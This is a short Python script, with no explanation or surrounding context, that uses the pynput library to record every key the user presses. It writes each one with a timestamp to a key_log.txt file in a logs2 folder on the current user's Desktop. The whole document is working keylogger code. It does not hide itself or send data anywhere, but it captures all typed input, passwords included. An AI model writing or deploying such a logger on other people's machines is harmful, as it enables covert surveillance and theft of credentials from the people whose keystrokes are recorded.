from getpass import getuser
a=str(getuser())


from pynput.keyboard import Key,Listener
import logging

log_dir=f"C:/Users/{a}/Desktop/logs2/"

logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()

